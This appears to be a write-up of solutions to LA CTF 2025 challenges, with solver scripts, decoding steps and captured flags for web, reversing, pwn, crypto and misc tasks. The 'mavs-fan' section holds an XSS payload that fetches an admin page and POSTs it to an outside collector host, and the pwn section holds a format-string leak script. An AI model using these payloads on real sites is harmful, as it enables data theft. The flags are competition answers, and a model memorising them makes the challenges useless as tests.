# web

## chessbased
[chall](https://github.com/uclaacm/lactf-archive/tree/main/2025/web/chessbased)  
flag is in `opening.js`.  

You can get flag in `/render?id=flag` without adming bot..

`lactf{t00_b4s3d_4t_ch3ss_f3_kf2}` 

## I spy..
[chall](https://github.com/uclaacm/lactf-archive/tree/main/2025/web/i-spy)  
* input token in page
* input token from HTML source code with F12
* input token in console
* input token in css file
* input token in javascript file
* input token in HTTP header
* input token in cookie
* input token in `/robots.txt`
* input token in `/sitemap.xml`
* input token by send request using DELETE method
* input token int TXT record

`lactf{1_sp0773d_z_t0k3ns_4v3rywh3r3}`

## lucky-flag
[chall](https://github.com/uclaacm/lactf-archive/tree/main/2025/web/lucky-flag)  
Else in function of `main.js` prints flag.  
Just copy and paste function that prints flag.  

`lactf{w4s_i7_luck_0r_ski11}`

## mavs-fan
[chall](https://github.com/uclaacm/lactf-archive/tree/main/2025/web/mavs-fan)  
[admin bot](https://github.com/uclaacm/lactf-archive/tree/main/2025/admin-bot)  
```html
<image src='x' onerror= "

    fetch('https://mavs-fan.chall.lac.tf/admin/', {
        method: 'GET',
        headers: {
            'Accept': 'text/html'
        }
    })
    .then(response => response.text())
    .then(data => {
        fetch('https://example.request.dreamhack.games', {  
            method: 'POST',
            headers: {
                'Content-Type': 'text/plain'
            },
            body: data
        });
    })
    .catch(error => console.error('Error:', error));

"/>
```
Use XSS script.  

`lactf{m4yb3_w3_sh0u1d_tr3d3_1uk4_f0r_4d}`

# REV
## javascription
[chall](https://github.com/uclaacm/lactf-archive/tree/main/2025/rev/javascryption)  
Encryption processes in `cabin.js`.  
Just reverse it.  

1. base64 decoding
2. URL decoding
3. replace `[OLD_DATA]` to `Z`
4. reverse
5. base64 decoding

`lactf{no_grizzly_walls_here}`

## nine-solves
[chall](https://github.com/uclaacm/lactf-archive/tree/main/2025/rev/nine-solves)  
```python
yi = [27, 38, 87, 95, 118, 9]

def find_valid_chars(yi):
    valid_chars = []
    
    for yi_ele in yi:
        for c in range(32, 127):
            input_ele = c
            step = 0

            while input_ele != 1:
                if input_ele % 2 == 0:
                    input_ele //= 2
                else:
                    input_ele = 3 * input_ele + 1
                step += 1
            
            if step == yi_ele:
                valid_chars.append(chr(c))
                break
    
    return "".join(valid_chars)

flag_input = find_valid_chars(yi)
print("Input: ", flag_input)
```
Input must be `AigyaP`.  

`lactf{the_only_valid_solution_is_BigyaP}`

## patricks-paraflag
[chall](https://github.com/uclaacm/lactf-archive/tree/main/2025/rev/patricks-paraflag)  
target is `l_alcotsft{_tihne__ifnlfaign_igtoyt}`  

it is shuffled as half in even index others in odd index.  

`lactf{the_flag_got_lost_in_infinity}`

# PWN
## 2password
[chall](https://github.com/uclaacm/lactf-archive/tree/main/2025/pwn/2password)  
You have to set `username` to `kaiphat`, `password1` to `correct horse battery staple` and `password2` to flag.  

Using `checksec ./chall`, PIE activated so cannot overwrite return address..  
But `printf` using variable directlry, so FSB can be used.  

`password2` is saved on `rbp-0xa0` and `flag` is saved on `rsp`.  
As calling convention, arguments in `printf` format string calls `rsi` -> `rdx` -> `rcx` -> `r8` -> `r9` -> Stack.

---
```python
from pwn import *

e = process('./chall', env = {'LD_PRELOAD' : './libc.so.6'})
p = remote('chall.lac.tf', 31142)

# p.sendlineafter(b'username: ', b'kaiphait')
# p.sendlineafter(b'password1: ', b'correct horse battery staple')
# p.sendlineafter(b'password2: ', b'lactf{')

payload = b'%6$llx %7$llx %8$llx %9$llx %10$llx'

p.sendlineafter(b'username: ', payload)
p.sendlineafter(b'password1: ', b'AAAA')
p.sendlineafter(b'password2: ', b'BBBB')


p.interactive()
```
It prints flag by little endian  

`lactf{hunter2_cfc0xz68}`

# CRYPTO
## big e

## Extremely Convenient Breaker

## bigram-times
[chall](https://github.com/uclaacm/lactf-archive/tree/main/2025/crypto/bigram-times)  
It encrypt code with two letters from string.  
It has many case.  
After brute force and delete unavailable characters set.  

```python
characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}~_"

def bigram_multiplicative_shift(bigram):
    assert(len(bigram) == 2)
    pos1 = characters.find(bigram[0]) + 1
    pos2 = characters.find(bigram[1]) + 1
    shift = (pos1 * pos2) % 67
    return characters[((pos1 * shift) % 67) - 1] + characters[((pos2 * shift) % 67) - 1]

test = "jlT84CKOAhxvdrPQWlWT6cEVD78z5QREBINSsU50FMhv662W"

flag = ""
block = ""
for x in range(0, 48, 2):
    for i in range(0,len(characters)):
        for j in range(0,len(characters)):
            block += characters[i] + characters[j]
            if bigram_multiplicative_shift(block) == test[x:x+2]:
                flag += block
                print(block, end='')
                block=""
            else: 
                block = ""
```
`lamCPKcttRRcf{u0Nrl}mUPwD8LT_Ay91p23l1myP2cAtTR8c~tiR7H9V3ZpDMLJ_6c{trR0fluPNmqLxDz_F{S04rhDBLE_pt3c9RhiB~E7i17y~2DbLg_5weUY}kpR3t9cii77~~iU7w~}`

`lactf{mULT1pl1cAtiV3_6R0uPz_4rE_9RE77y_5we3t~~~}`

# MISC
## broken ships
[chall](https://github.com/uclaacm/lactf-archive/tree/main/2025/misc/broken-ships)  
`Docker-Distribution-Api-Version` is in HTTP header.  
So we can guess this is a docker API server.  

in `/__catalog`, you can find the name of repository.  
`{"repositories":["rms-titanic"]}`  

In `/rms-titanic/tags/list`, you can get tags.  
`{"name":"rms-titanic","tags":["wreck"]}`

In `/rms-titanic/manifests/wreck`, the `wreck` file is downloaded.  

```json
{
   "schemaVersion": 1,
   "name": "rms-titanic",
   "tag": "wreck",
   "architecture": "arm64",
   "fsLayers": [
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:99aa9a6fbb91b4bbe98b78d048ce283d3758feebfd7c0561c478ee2ddf23c59f"
      },
      {
         "blobSum": "sha256:529375a25a3d641351bf6e3e94cb706cda39deea9e6bdc3a8ba6940e6cc4ef65"
      },
      {
         "blobSum": "sha256:60b6ee789fd8267adc92b806b0b8777c83701b7827e6cb22c79871fde4e136b9"
      },
      {
         "blobSum": "sha256:bae434f430e461b8cff40f25e16ea1bf112609233052d0ad36c10a7ab787e81c"
      },
      {
         "blobSum": "sha256:9082f840f63805c478931364adeea30f4e350a7e2e4f55cafe4e3a3125b04624"
      }
   ],
   "history": [
      {
         "v1Compatibility": "{\"architecture\":\"arm64\",\"config\":{\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"sleep\",\"infinity\"],\"ArgsEscaped\":true},\"created\":\"2025-02-04T00:11:23.087132546Z\",\"id\":\"835e639aa9d090b4bb2028c0e86ca49ee10477c048c01d2d500ca1ff0620b854\",\"os\":\"linux\",\"parent\":\"d5417d70da785f20922f5180d3057298de842c800f7ac8ef80f9a5707aa933b2\",\"throwaway\":true,\"variant\":\"v8\"}"
      },
      {
         "v1Compatibility": "{\"id\":\"d5417d70da785f20922f5180d3057298de842c800f7ac8ef80f9a5707aa933b2\",\"parent\":\"fc692fb7be236ded3f97802b5b2a2e4b8a20366157c22a8c448c25752c5bc84c\",\"comment\":\"buildkit.dockerfile.v0\",\"created\":\"2025-02-04T00:11:23.087132546Z\",\"container_config\":{\"Cmd\":[\"RUN /bin/sh -c echo \\\"flag\\\" \\u003e /flag.txt # buildkit\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"fc692fb7be236ded3f97802b5b2a2e4b8a20366157c22a8c448c25752c5bc84c\",\"parent\":\"efd22692f3385ccf96866e1b10124f18512ae3b48848ddcfc662a43ee64104fc\",\"comment\":\"buildkit.dockerfile.v0\",\"created\":\"2025-02-04T00:11:22.988021129Z\",\"container_config\":{\"Cmd\":[\"RUN /bin/sh -c rm flag.txt # buildkit\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"efd22692f3385ccf96866e1b10124f18512ae3b48848ddcfc662a43ee64104fc\",\"parent\":\"0792c9fcb47020e0001147667e2455c29e8a8865d49b517ec09920b625b400d6\",\"comment\":\"buildkit.dockerfile.v0\",\"created\":\"2025-02-04T00:11:22.870739296Z\",\"container_config\":{\"Cmd\":[\"COPY flag.txt / # buildkit\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"0792c9fcb47020e0001147667e2455c29e8a8865d49b517ec09920b625b400d6\",\"parent\":\"94d87d7e20a72f3b9093cd8c623461dd98995bf0d3d83a2af6cf81d68b8e5bdb\",\"comment\":\"buildkit.dockerfile.v0\",\"created\":\"2025-02-04T00:11:22.858620838Z\",\"container_config\":{\"Cmd\":[\"RUN /bin/sh -c echo \\\"lactf{fake_flag}\\\" \\u003e flag.txt # buildkit\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"94d87d7e20a72f3b9093cd8c623461dd98995bf0d3d83a2af6cf81d68b8e5bdb\",\"comment\":\"debuerreotype 0.15\",\"created\":\"2025-01-13T00:00:00Z\",\"container_config\":{\"Cmd\":[\"# debian.sh --arch 'arm64' out/ 'bookworm' '@1736726400'\"]}}"
      }
   ],
   "signatures": [
      {
         "header": {
            "jwk": {
               "crv": "P-256",
               "kid": "EYMR:GL3K:SEES:KR6Q:FQV7:W7GO:GJPS:ITID:N33Z:U4XD:BBWP:X2NH",
               "kty": "EC",
               "x": "fBjyFQk2-7MvBMhLN1UkuWjajZY0kl9hcwPB7FIw20Q",
               "y": "hDTHShelufdCikq7mrG_iTSKptZDxukAFy_2IcpQnPc"
            },
            "alg": "ES256"
         },
         "signature": "KBKTON0dnwbw_9ue1kS4DJUkuoJ7lJ8M7KTGPkVNoXreBWOm4Gkql5Xg4JpVb4wz6Js2csC882Jio6VtpJqCLg",
         "protected": "eyJmb3JtYXRMZW5ndGgiOjMwODksImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyNS0wMi0wOVQxNjoyMTo1NVoifQ"
      }
   ]
}
```
We can guess it is some log file.  

Let's download a file in `/rms-titanic/blobs/sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4`.  
Extracting hex by 010 editor, you can find this file is `gzip` file.  

If you unzip this file, you can get `flag.txt`.  

`lactf{thx_r_s4lv4g1ng_my_sh1p!}`

## Danger Searching
[Place](https://maps.app.goo.gl/Ne25vC3RRgAmxDBa8)  

`lactf{73G66738+9C}`

## extended
[chall](https://github.com/uclaacm/lactf-archive/tree/main/2025/misc/extended)  
```python
with open('./misc_extended/chall.txt', 'rb') as f:
    encoded_flag = f.read().decode('iso8859-1')

flag = ""

for c in encoded_flag:
    o = bin(ord(c))[2:].zfill(8)

    for i in range(8):
        if o[i] == "1":
            o = o[:i] + "0" + o[i + 1 :]
            break
    flag += chr(int(o, 2))

print(flag)
```
Just replace 0 to 1 and 1 to 0.  

`lactf{Funnily_Enough_This_Looks_Different_On_Mac_And_Windows}`
